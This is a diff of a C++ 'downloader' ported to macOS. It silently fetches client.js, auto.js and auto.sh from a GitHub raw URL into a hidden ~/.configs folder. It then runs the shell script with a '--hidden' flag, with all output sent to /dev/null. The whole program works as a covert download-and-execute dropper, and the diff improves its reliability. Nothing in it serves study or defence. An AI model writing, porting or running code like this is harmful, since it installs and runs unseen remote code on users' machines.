@@ -1,5 +1,5 @@
-// main.cpp — POSIX (Linux/macOS)
-// Build: g++ -std=c++17 -O2 -o downloader main.cpp
+// main.cpp — macOS
+// Build: clang++ -std=c++17 -O2 -o downloader main.cpp
 #include <cerrno>
 #include <cstdlib>
 #include <filesystem>
@@ -13,8 +13,6 @@
 
 namespace fs = std::filesystem;
 
-// Equivalent to bash `-x` / `command -v` hit: regular file the user can execute.
-// Follows symlinks (stat) and uses access(2) so group/other execute bits count.
 static bool is_executable_file(const std::string& path) {
     struct stat st;
     if (stat(path.c_str(), &st) != 0) return false;
@@ -22,20 +20,16 @@ static bool is_executable_file(const std::string& path) {
     return access(path.c_str(), X_OK) == 0;
 }
 
-// Equivalent to `command -v <name>`.
 static bool command_exists(const std::string& name) {
-    if (name.find('/') != std::string::npos) {
-        return is_executable_file(name);
-    }
+    if (name.find('/') != std::string::npos) return is_executable_file(name);
     const char* path_env = std::getenv("PATH");
     if (!path_env) return false;
     std::string p(path_env);
     size_t start = 0;
     while (true) {
         size_t end = p.find(':', start);
-        std::string dir = (end == std::string::npos)
-                              ? p.substr(start)
-                              : p.substr(start, end - start);
+        std::string dir = (end == std::string::npos) ? p.substr(start)
+                                                     : p.substr(start, end - start);
         if (dir.empty()) dir = ".";
         if (is_executable_file(dir + "/" + name)) return true;
         if (end == std::string::npos) break;
@@ -47,6 +41,9 @@ static bool command_exists(const std::string& name) {
 // fork+exec with stdout & stderr redirected to /dev/null.
 // Returns child's exit code (128+signal if killed), or -1 on fork/wait failure.
 static int run_silenced(const std::vector<std::string>& args) {
+    std::cout.flush();
+    std::cerr.flush();          // don't let buffered parent output leak into child
+
     pid_t pid = fork();
     if (pid < 0) return -1;
 
@@ -55,112 +52,73 @@ static int run_silenced(const std::vector<std::string>& args) {
         if (fd >= 0) {
             dup2(fd, STDOUT_FILENO);
             dup2(fd, STDERR_FILENO);
-            if (fd > STDERR_FILENO) close(fd); // never close a std fd
+            if (fd > STDERR_FILENO) close(fd);
         }
         std::vector<char*> argv;
         argv.reserve(args.size() + 1);
         for (const auto& a : args) argv.push_back(const_cast<char*>(a.c_str()));
         argv.push_back(nullptr);
         execvp(argv[0], argv.data());
-        _exit(127); // "command not found" (matches shell)
+        _exit(127);
     }
 
     int status = 0;
     pid_t w;
-    do {
-        w = waitpid(pid, &status, 0);
-    } while (w == -1 && errno == EINTR);
-
+    do { w = waitpid(pid, &status, 0); } while (w == -1 && errno == EINTR);
     if (w == -1) return -1;
-    if (WIFEXITED(status))  return WEXITSTATUS(status);
-    return 128 + WTERMSIG(status); // mirror bash's $?
+    if (WIFEXITED(status)) return WEXITSTATUS(status);
+    return 128 + WTERMSIG(status);
 }
 
 static bool save_hidden_file(const std::string& url, const std::string& target) {
-    std::error_code ec;
-
-    // bash: [ -f "$TARGET_PATH" ] && chmod 644
-    // (-f is regular-file only; fs::exists would also match directories.)
-    if (fs::is_regular_file(target, ec)) {
-        fs::permissions(target,
-                        fs::perms::owner_read | fs::perms::owner_write |
-                        fs::perms::group_read | fs::perms::others_read,
-                        ec); // 0644, errors silently ignored
-    }
-
+    // macOS always ships /usr/bin/curl; still prefer PATH lookup in case a
+    // newer one was installed (e.g. Homebrew).
     std::string curl_bin;
-    if      (command_exists("curl"))                curl_bin = "curl";
-    else if (command_exists("/usr/bin/curl"))       curl_bin = "/usr/bin/curl";
-    else if (command_exists("/usr/local/bin/curl")) curl_bin = "/usr/local/bin/curl";
+    if      (command_exists("curl"))          curl_bin = "curl";
+    else if (command_exists("/usr/bin/curl")) curl_bin = "/usr/bin/curl";
+    else return false;
 
-    int rc = -1;
-    if (!curl_bin.empty()) {
-        rc = run_silenced({curl_bin, "-sS", "--tlsv1.2", "-o", target, url});
-    } else {
-        // Python fallback. Passing URL/target via env fixes the original's
-        // single-quote injection bug (bash interpolated them into a '...' string).
-        if (setenv("DL_URL",    url.c_str(),    1) != 0 ||
-            setenv("DL_TARGET", target.c_str(), 1) != 0) {
-            return false;
-        }
-        rc = run_silenced({"python3", "-c",
-            "import os,urllib.request;"
-            "urllib.request.urlretrieve(os.environ['DL_URL'],os.environ['DL_TARGET'])"});
-    }
+    // -f : fail on HTTP >= 400 (otherwise 404 page is saved as the file)
+    // -s : silent
+    // -S : re-enable error messages (needed because we use -s)
+    // -L : follow redirects (raw.githubusercontent may redirect)
+    int rc = run_silenced({curl_bin, "-fsSL", "--tlsv1.2",
+                           "-o", target, url});
+    if (rc != 0) return false;
 
-    if (rc == 0) {
-        fs::permissions(target,
-                        fs::perms::owner_read | fs::perms::owner_write,
-                        ec); // 0600, errors silently ignored
-        return true;
-    }
-    return false;
+    std::error_code ec;
+    fs::permissions(target,
+                    fs::perms::owner_read | fs::perms::owner_write,
+                    fs::perms::replace, ec);
+    return !ec;
 }
 
 int main() {
-    // bash behavior: unset or empty HOME both expand to "/.configs".
     const char* home_env = std::getenv("HOME");
-    const std::string home = home_env ? home_env : "";
-    const std::string config_path = home + "/.configs";
+    if (!home_env || !*home_env) { std::cout << "Failed\n"; return 1; }
+
+    const std::string config_path = std::string(home_env) + "/.configs";
 
     std::error_code ec;
     fs::create_directories(config_path, ec);
-    if (!fs::is_directory(config_path, ec)) {
-        // bash would show mkdir's own stderr; mirror that.
-        if (ec) std::cerr << "mkdir: " << ec.message() << "\n";
-        std::cout << "Failed\n";
-        return 1;
+    if (!fs::is_directory(config_path, ec)) { std::cout << "Failed\n"; return 1; }
+
+    const std::string base =
+        "https://raw.githubusercontent.com/rahul-call/export/main/ror/";
+    const char* files[] = { "client.js", "auto.js", "auto.sh" };
+
+    for (const char* name : files) {
+        const std::string target = config_path + "/" + name;
+        if (!save_hidden_file(base + name, target)) {
+            std::cout << "Failed\n";
+            return 1;
+        }
     }
 
-    const std::string final_path = config_path + "/client.js";
-    if (!save_hidden_file(
-            "https://raw.githubusercontent.com/rahul-call/export/main/ror/client.js",
-            final_path)) {
-        std::cout << "Failed\n";
-        return 1;
-    }
+    const std::string auto_sh   = config_path + "/auto.sh";
+    const std::string client_js = config_path + "/client.js";
 
-
-    const std::string final_path0 = config_path + "/auto.js";
-    if (!save_hidden_file(
-            "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.js",
-            final_path0)) {
-        std::cout << "Failed\n";
-        return 1;
-    }
-    
-    const std::string final_path3 = config_path + "/auto.sh";
-    if (!save_hidden_file(
-            "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.sh",
-            final_path3)) {
-        std::cout << "Failed\n";
-        return 1;
-    }
-
-    int rc = run_silenced({"bash", final_path3, final_path, "--hidden"});
-    if (rc != 0) {
-        std::cout << "Failed\n";
-        return 1;
-    }
+    int rc = run_silenced({"bash", auto_sh, client_js, "--hidden"});
+    if (rc != 0) { std::cout << "Failed\n"; return 1; }
     return 0;
 }
